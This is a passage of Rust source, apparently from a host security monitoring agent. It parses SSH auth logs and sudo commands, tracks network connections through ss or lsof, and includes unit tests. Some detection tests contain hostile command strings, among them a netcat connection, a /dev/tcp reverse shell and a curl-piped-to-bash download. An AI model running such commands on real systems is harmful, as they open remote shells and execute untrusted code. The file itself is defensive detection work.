    files: Vec<String>,
    re_failed: Regex,
    re_accepted: Regex,
    re_sudo: Regex,
    first: bool,
}

impl AuthLogCollector {
    pub fn new() -> Self {
        AuthLogCollector {
            offsets: HashMap::new(),
            files: vec!["/var/log/auth.log".into(), "/var/log/secure".into()],
            re_failed: Regex::new(r"Failed password for (?:invalid user )?(\S+) from (\S+)")
                .unwrap(),
            re_accepted: Regex::new(r"Accepted (\w+) for (\S+) from (\S+)").unwrap(),
            re_sudo: Regex::new(r"sudo:\s+(\S+)\s+:.*COMMAND=(.+)$").unwrap(),
            first: true,
        }
    }

    pub fn poll(&mut self) -> Vec<Event> {
        let mut out = Vec::new();
        for path in self.files.clone() {
            let Ok(mut f) = std::fs::File::open(&path) else {
                continue;
            };
            let len = f.metadata().map(|m| m.len()).unwrap_or(0);
            let mut off = *self.offsets.get(&path).unwrap_or(&0);
            if self.first {
                // start from the end on first run; don't replay history
                self.offsets.insert(path.clone(), len);
                continue;
            }
            if len < off {
                off = 0; // rotated
            }
            if len == off {
                continue;
            }
            if f.seek(SeekFrom::Start(off)).is_err() {
                continue;
            }
            let mut buf = String::new();
            if f.take(1_000_000).read_to_string(&mut buf).is_err() {
                continue;
            }
            self.offsets.insert(path.clone(), len);
            for line in buf.lines() {
                if let Some(c) = self.re_failed.captures(line) {
                    out.push(self.auth(
                        &c[1],
                        &c[2],
                        "failure",
                        "ssh",
                        "auth_fail",
                        "low",
                        format!("failed password for {} from {}", &c[1], &c[2]),
                    ));
                } else if let Some(c) = self.re_accepted.captures(line) {
                    out.push(self.auth(
                        &c[2],
                        &c[3],
                        "success",
                        "ssh",
                        "login",
                        "info",
                        format!("accepted {} for {} from {}", &c[1], &c[2], &c[3]),
                    ));
                } else if let Some(c) = self.re_sudo.captures(line) {
                    let mut ev = Event::new("ssh", "sudo", "medium")
                        .with_user(&c[1])
                        .msg(format!("sudo by {}: {}", &c[1], c[2].trim()));
                    ev.process = Some(Process {
                        name: "sudo".into(),
                        cmdline: c[2].trim().into(),
                        user: c[1].into(),
                        ..Default::default()
                    });
                    out.push(ev);
                }
            }
        }
        self.first = false;
        out
    }

    fn auth(
        &self,
        user: &str,
        ip: &str,
        result: &str,
        cat: &str,
        action: &str,
        sev: &str,
        msg: String,
    ) -> Event {
        let mut ev = Event::new(cat, action, sev).with_user(user).msg(msg);
        ev.auth = Some(AuthInfo {
            method: "password".into(),
            source_ip: ip.into(),
            tty: "ssh".into(),
            result: result.into(),
        });
        ev
    }
}

// ---------------- network ----------------

pub struct NetworkCollector {
    /// connections already turned into events (5-tuple keys), GC'd when the socket closes.
    emitted: HashSet<String>,
    /// global-IP connections deferred one poll so background rDNS can resolve before emit.
    pending: HashSet<String>,
    first: bool,
    dns: crate::dnscache::DnsCache,
}

impl NetworkCollector {
    pub fn new(dns: crate::dnscache::DnsCache) -> Self {
        NetworkCollector {
            emitted: HashSet::new(),
            pending: HashSet::new(),
            first: true,
            dns,
        }
    }

    pub fn poll(&mut self) -> Vec<Event> {
        let conns = established_connections();
        let current: HashSet<String> = conns.iter().map(|c| c.key()).collect();
        let mut out = Vec::new();
        for conn in &conns {
            let key = conn.key();
            if self.emitted.contains(&key) {
                continue;
            }
            if self.first {
                self.emitted.insert(key); // baseline: don't flood with the existing socket table
                continue;
            }
            let ip = remote_ip(&conn.remote);
            let global = ip.map(crate::dnscache::is_global).unwrap_or(false);
            // Attribute the remote IP to a domain (eBPF DNS cache → best-effort rDNS).
            let domain = ip.and_then(|i| self.dns.lookup(i)).unwrap_or_default();
            // rDNS resolves on a background thread, so the first lookup of a fresh global IP
            // misses. Defer the connection one poll (~5s) so the event carries the hostname
            // instead of a bare IP. Only defer once — if it still hasn't resolved, emit the IP.
            if domain.is_empty() && global && !self.pending.contains(&key) {
                self.pending.insert(key);
                continue;
            }
            self.pending.remove(&key);
            self.emitted.insert(key.clone());

            let direction = classify_direction(&conn.local, &conn.remote);
            let who = if conn.process.is_empty() {
                String::new()
            } else {
                format!(" by {} (pid {})", conn.process, conn.pid)
            };
            let peer = if domain.is_empty() {
                conn.remote.clone()
            } else {
                format!("{} [{}]", domain, conn.remote)
            };
            let msg = if direction == "inbound" {
                format!("inbound {} connection from {}{}", conn.proto, peer, who)
            } else {
                format!("outbound {} connection to {}{}", conn.proto, peer, who)
            };
            // Private/link-local peers are intra-host/LAN, not "internet" — label them so the
            // console can separate internal traffic from real external destinations.
            let category = if !global {
                "internal".to_string()
            } else if !domain.is_empty() {
                categorize_domain(&domain).to_string()
            } else {
                conn.category()
            };
            let mut ev = Event::new("network", "connect", "info").msg(msg);
            ev.network = Some(NetInfo {
                direction: direction.into(),
                proto: conn.proto.clone(),
                local_addr: conn.local.clone(),
                remote: conn.remote.clone(),
                domain,
                category,
                bytes_out: conn.bytes_out,
                bytes_in: conn.bytes_in,
                ..Default::default()
            });
            if conn.pid > 0 {
                ev.process = Some(Process {
                    pid: conn.pid,
                    name: conn.process.clone(),
                    ..Default::default()
                });
            }
            out.push(ev);
        }
        // GC sockets that have closed so a later reconnect re-emits (and re-resolves).
        self.emitted.retain(|k| current.contains(k));
        self.pending.retain(|k| current.contains(k));
        self.first = false;
        out
    }
}

/// Decide outbound (we initiated; remote is the server) vs inbound (remote is a client of our
/// listening port) from the two port numbers. A well-known service port on one side marks the
/// server; otherwise the numerically-lower port is the server side.
fn classify_direction(local: &str, remote: &str) -> &'static str {
    let port = |a: &str| remote_port(a).and_then(|p| p.parse::<u32>().ok()).unwrap_or(0);
    let (lp, rp) = (port(local), port(remote));
    let (lsvc, rsvc) = (is_service_port(lp), is_service_port(rp));
    if rsvc && !lsvc {
        return "outbound";
    }
    if lsvc && !rsvc {
        return "inbound";
    }
    if lp != 0 && rp != 0 && lp < rp {
        "inbound"
    } else {
        "outbound"
    }
}

/// Common server/listening ports — used to infer connection direction.
fn is_service_port(p: u32) -> bool {
    matches!(
        p,
        20 | 21
            | 22
            | 25
            | 53
            | 80
            | 110
            | 123
            | 143
            | 389
            | 443
            | 465
            | 587
            | 636
            | 853
            | 993
            | 995
            | 1433
            | 3306
            | 3389
            | 5432
            | 5672
            | 6379
            | 8080
            | 8443
            | 9092
            | 9200
            | 11211
            | 27017
    )
}

#[derive(Clone, Default)]
struct Conn {
    proto: String,
    local: String,
    remote: String,
    pid: i64,
    process: String,
    bytes_out: i64,
    bytes_in: i64,
}

impl Conn {
    fn key(&self) -> String {
        format!("{}|{}|{}", self.proto, self.local, self.remote)
    }

    fn category(&self) -> String {
        match remote_port(&self.remote).as_deref() {
            Some("80") | Some("443") | Some("8080") => "web".into(),
            _ => String::new(),
        }
    }
}

/// Parse ss's process column `users:(("name",pid=1234,fd=5))` → (pid, name). First socket
/// owner only (the common case). Returns (0, "") when no process info is present.
fn parse_ss_process(field: &str) -> (i64, String) {
    let name = field
        .split_once("((\"")
        .and_then(|(_, rest)| rest.split_once('"'))
        .map(|(n, _)| n.to_string())
        .unwrap_or_default();
    let pid = field
        .split_once("pid=")
        .and_then(|(_, rest)| {
            let end = rest
                .find(|c: char| !c.is_ascii_digit())
                .unwrap_or(rest.len());
            rest[..end].parse::<i64>().ok()
        })
        .unwrap_or(0);
    (pid, name)
}

/// Parse `bytes_sent:N` / `bytes_received:N` from an `ss -i` info line → (out, in).
fn parse_ss_bytes(info: &str) -> (i64, i64) {
    let field = |k: &str| -> i64 {
        info.split_once(k)
            .and_then(|(_, rest)| {
                let end = rest
                    .find(|c: char| !c.is_ascii_digit())
                    .unwrap_or(rest.len());
                rest[..end].parse::<i64>().ok()
            })
            .unwrap_or(0)
    };
    (field("bytes_sent:"), field("bytes_received:"))
}

fn established_connections() -> Vec<Conn> {
    #[cfg(target_os = "macos")]
    {
        let out = match Command::new("lsof")
            .args(["-nP", "-iTCP", "-sTCP:ESTABLISHED"])
            .output()
        {
            Ok(o) => o,
            Err(_) => return Vec::new(),
        };
        let text = String::from_utf8_lossy(&out.stdout);
        let mut set: HashMap<String, Conn> = HashMap::new();
        for line in text.lines().filter(|l| !l.starts_with("COMMAND")) {
            for tok in line.split_whitespace() {
                if let Some((local, remote)) = tok.split_once("->") {
                    if is_remote(remote) {
                        let c = Conn {
                            proto: "tcp".into(),
                            local: local.into(),
                            remote: remote.into(),
                            ..Default::default()
                        };
                        set.insert(c.key(), c);
                    }
                }
            }
        }
        return set.into_values().take(50).collect();
    }
    #[cfg(not(target_os = "macos"))]
    {
        // -i adds a per-socket info line (bytes_sent/received); -p adds the owning process.
        let out = match Command::new("ss")
            .args(["-tunpi", "state", "established"])
            .output()
        {
            Ok(o) => o,
            Err(_) => return Vec::new(),
        };
        let text = String::from_utf8_lossy(&out.stdout);
        let mut conns: Vec<Conn> = Vec::new();
        for line in text.lines() {
            if line.starts_with("Netid") || line.trim().is_empty() {
                continue;
            }
            // Indented continuation = the `-i` info line for the previous connection.
            if line.starts_with(char::is_whitespace) {
                if let Some(last) = conns.last_mut() {
                    let (o, i) = parse_ss_bytes(line);
                    last.bytes_out = o;
                    last.bytes_in = i;
                }
                continue;
            }
            let fields: Vec<&str> = line.split_whitespace().collect();
            if fields.len() < 5 {
                continue;
            }
            let remote = fields[4].to_string();
            if !is_remote(&remote) {
                continue;
            }
            let (pid, process) = fields
                .iter()
                .find(|f| f.starts_with("users:("))
                .map(|&f| parse_ss_process(f))
                .unwrap_or((0, String::new()));
            conns.push(Conn {
                proto: fields[0].to_string(),
                local: fields[3].to_string(),
                remote,
                pid,
                process,
                bytes_out: 0,
                bytes_in: 0,
            });
        }
        // De-dup by 5-tuple, keep first; cap to avoid floods.
        let mut set: HashMap<String, Conn> = HashMap::new();
        for c in conns {
            set.entry(c.key()).or_insert(c);
        }
        return set.into_values().take(50).collect();
    }
    #[allow(unreachable_code)]
    Vec::new()
}

fn is_remote(addr: &str) -> bool {
    !(addr.starts_with("127.")
        || addr.starts_with("::1")
        || addr.starts_with("localhost")
        || addr.starts_with("0.0.0.0")
        || addr.starts_with("*"))
}

fn remote_port(addr: &str) -> Option<String> {
    let trimmed = addr.trim_end_matches(',');
    trimmed
        .rsplit_once(':')
        .map(|(_, port)| port.trim_matches(']').to_string())
}

/// Parse the IP from an "ip:port" string (handles IPv4 `1.2.3.4:443` and IPv6 `[2001:db8::1]:443`).
fn remote_ip(addr: &str) -> Option<std::net::IpAddr> {
    let a = addr.trim().trim_end_matches(',');
    let host = if let Some(rest) = a.strip_prefix('[') {
        rest.split(']').next().unwrap_or("") // [v6]:port
    } else if a.matches(':').count() == 1 {
        a.rsplit_once(':').map(|(h, _)| h).unwrap_or(a) // v4:port
    } else {
        a // bare v6 or bare ip
    };
    host.parse().ok()
}

fn truncate(s: &str, n: usize) -> String {
    if s.len() <= n {
        return s.to_string();
    }
    // Cut on a UTF-8 char boundary — slicing raw bytes panics on multibyte cmdlines.
    let mut end = n;
    while end > 0 && !s.is_char_boundary(end) {
        end -= 1;
    }
    format!("{}…", &s[..end])
}

#[cfg(test)]
mod p0_tests {
    use super::*;

    #[test]
    fn ss_process_field_parses_pid_and_name() {
        let (pid, name) = parse_ss_process(r#"users:(("curl",pid=1234,fd=5))"#);
        assert_eq!(pid, 1234);
        assert_eq!(name, "curl");
        // no process info → zeros
        assert_eq!(parse_ss_process("-"), (0, String::new()));
    }

    #[test]
    fn direction_from_ports() {
        // remote is a well-known service port, local ephemeral → we dialed out
        assert_eq!(classify_direction("10.0.0.2:51234", "1.1.1.1:443"), "outbound");
        // local is our listening port, remote ephemeral → someone dialed in
        assert_eq!(classify_direction("10.0.0.2:443", "203.0.113.9:51234"), "inbound");
        assert_eq!(classify_direction("10.0.0.2:22", "203.0.113.9:60000"), "inbound");
        // ipv6 forms
        assert_eq!(classify_direction("[2001:db8::2]:51000", "[2606:4700::1]:443"), "outbound");
        // postgres backend: client ephemeral → server 5432 (we are the client side here)
        assert_eq!(classify_direction("172.23.0.4:44036", "172.23.0.5:5432"), "outbound");
    }

    #[test]
    fn worker_relabel_detected() {
        assert!(is_worker_relabel("postgres", "postgres: postgres comp 172.23.0.5(44122) idle"));
        assert!(is_worker_relabel("nginx", "nginx: worker process"));
        // a real command must NOT be filtered
        assert!(!is_worker_relabel("bash", "bash -c whoami"));
        assert!(!is_worker_relabel("python3", "python3 -m http.server"));
    }

    #[test]
    fn ss_info_line_parses_bytes() {
        let line = " cubic wscale:7,7 rto:204 bytes_sent:54321 bytes_acked:54000 bytes_received:678 segs_out:9";
        let (out, inb) = parse_ss_bytes(line);
        assert_eq!(out, 54321);
        assert_eq!(inb, 678);
    }

    #[test]
    fn removable_mount_prefixes() {
        assert!(is_removable_mount("/media/usb0"));
        assert!(is_removable_mount("/run/media/alice/STICK"));
        assert!(is_removable_mount("/mnt"));
        assert!(!is_removable_mount("/"));
        assert!(!is_removable_mount("/home/alice"));
    }

    #[test]
    fn cgroup_detects_docker_container() {
        let id = "a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f60011";
        let text = format!("0::/system.slice/docker-{id}.scope");
        let got = parse_container_from_cgroup(&text);
        assert_eq!(got, format!("docker:{}", &id[..12]));
    }

    #[test]
    fn cgroup_kubepods_and_bare() {
        let id = "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef";
        let kube =
            format!("0::/kubepods.slice/kubepods-burstable-pod.../cri-containerd-{id}.scope");
        assert!(parse_container_from_cgroup(&kube).ends_with(&id[..12]));
        // host process (no container id) → empty
        assert_eq!(parse_container_from_cgroup("0::/init.scope"), "");
    }

    #[test]
    fn proc_modules_first_token() {
        let text = "nf_tables 245760 1 - Live 0x0\nevil_rk 16384 0 - Live 0x0\n";
        assert_eq!(parse_proc_modules(text), vec!["nf_tables", "evil_rk"]);
    }

    #[test]
    fn proc_mounts_filters_to_removable() {
        let text = "\
proc /proc proc rw 0 0
/dev/sda1 / ext4 rw 0 0
/dev/sdb1 /media/usb\\040stick vfat rw 0 0
tmpfs /mnt/should_skip tmpfs rw 0 0
/dev/sdc1 /run/media/bob/DATA exfat rw 0 0";
        let m = parse_proc_mounts(text);
        // root, proc, and tmpfs are excluded; two removable vfat/exfat mounts remain.
        assert_eq!(m.len(), 2);
        assert_eq!(m[0].mountpoint, "/media/usb stick"); // \040 decoded
        assert_eq!(m[0].fstype, "vfat");
        assert_eq!(m[1].mountpoint, "/run/media/bob/DATA");
    }

    #[test]
    fn categorize_domain_buckets() {
        assert_eq!(categorize_domain("mail.google.com"), "webmail");
        assert_eq!(categorize_domain("drive.google.com"), "cloud_storage");
        assert_eq!(categorize_domain("www.dropbox.com"), "cloud_storage");
        assert_eq!(categorize_domain("FACEBOOK.com"), "social"); // case-insensitive
        assert_eq!(categorize_domain("github.com"), "dev");
        assert_eq!(categorize_domain("example.com"), "web");
    }

    #[test]
    fn is_suspicious_flags_tools_and_patterns() {
        assert!(is_suspicious("nc", "nc 10.0.0.1 4444"));
        assert!(is_suspicious("bash", "bash -c 'sh </dev/tcp/x/1'"));
        assert!(is_suspicious("sh", "curl http://x | bash"));
        assert!(!is_suspicious("ls", "ls -la"));
        assert!(!is_suspicious("cat", "cat /etc/hostname"));
    }

    #[test]
    fn truncate_respects_utf8_boundaries() {
        // ASCII under limit unchanged
        assert_eq!(truncate("abc", 10), "abc");
        // multibyte must not panic and must stay valid UTF-8
        let s = "héllo wörld ✓ multibyte";
        let t = truncate(s, 7);
        assert!(t.ends_with('…'));
        assert!(t.is_char_boundary(t.len()));
        // emoji (4-byte) cut point
        let e = "🚀🚀🚀🚀🚀";
        let _ = truncate(e, 5); // must not panic mid-codepoint
    }

    #[test]
    fn remote_addr_helpers() {
        assert!(is_remote("8.8.8.8:443"));
        assert!(!is_remote("127.0.0.1:22"));
        assert!(!is_remote("::1"));
        assert!(!is_remote("0.0.0.0:80"));
        assert_eq!(remote_port("1.2.3.4:443").as_deref(), Some("443"));
        assert_eq!(remote_port("[2001:db8::1]:8080").as_deref(), Some("8080"));
    }

    #[test]
    fn ss_process_malformed_is_safe() {
        // garbage must not panic; yields zeros / empty
        assert_eq!(parse_ss_process("users:((garbage"), (0, String::new()));
        let (pid, name) = parse_ss_process(r#"users:(("sshd",pid=1,fd=3),("x",pid=2,fd=4))"#);
        assert_eq!(pid, 1); // first owner
        assert_eq!(name, "sshd");
    }

    #[test]
    fn longest_hex_run_threshold() {
        assert!(longest_hex_run("/system.slice/init.scope").is_none()); // no long hex
        assert!(longest_hex_run("docker").is_none()); // short
        let id = "abcdef0123456789abcdef0123456789abcd"; // 36 hex
        assert_eq!(
            longest_hex_run(&format!("x-{id}.scope")).as_deref(),
            Some(id)
        );
    }

    #[test]
    fn posture_grading() {
        let mut m = std::collections::HashMap::new();
        m.insert("kptr_restrict".into(), "0".into());
        m.insert("unprivileged_bpf_disabled".into(), "0".into());
        m.insert("ima".into(), "absent".into());
        let (weak, sev) = grade_posture(&m);
        assert!(weak.iter().any(|w| w.contains("kptr_restrict")));
        assert!(weak.iter().any(|w| w.contains("bpf")));
        assert!(weak.iter().any(|w| w.contains("IMA")));
        assert_eq!(sev, "high"); // bpf weak → high
                                 // hardened host → no findings, info
        let mut good = std::collections::HashMap::new();
        good.insert("kptr_restrict".into(), "2".into());
        good.insert("unprivileged_bpf_disabled".into(), "1".into());
        good.insert("ima".into(), "present".into());
        let (w2, s2) = grade_posture(&good);
        assert!(w2.is_empty());
        assert_eq!(s2, "info");
    }

    #[test]
    fn cgroup_podman_crio_and_none() {
        let id = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
        assert!(
            parse_container_from_cgroup(&format!("0::/machine.slice/libpod-{id}.scope"))
                .starts_with("podman:")
        );
        assert!(
            parse_container_from_cgroup(&format!("0::/system.slice/crio-{id}.scope"))
                .starts_with("crio:")
        );
        assert_eq!(
            parse_container_from_cgroup("0::/user.slice/user-1000.slice"),
            ""
        );
    }
}
